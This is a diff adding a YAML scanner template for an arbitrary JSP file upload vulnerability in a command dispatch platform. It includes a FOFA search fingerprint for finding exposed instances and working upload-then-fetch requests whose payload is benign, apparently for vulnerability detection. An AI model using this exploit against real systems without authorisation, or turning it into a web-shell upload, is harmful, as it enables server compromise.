@@ -1,0 +1,31 @@
+id: poc-yaml-command-dispatch-platform-uploadfile-anyfile-upload
+info:
+  name: 可视化融合指挥调度平台 uploadFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 可视化融合指挥调度平台
+  fofa: body="base/searchInfoWindow_min.css"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /dispatch/layuiIm/uploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+  data: '------WebKitFormBoundary7ctER307B0RaQwOp
+
+    Content-Disposition: form-data; name="file";filename="{{.t1}}.jsp"
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp--'
+  expression: status_code == 200 && contains(body,t1) && contains(body,"src")
+  output:
+  - regex_match(body,`"src":"/(?P<path>.*?).jsp`)
+- method: GET
+  path: /{{.path}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
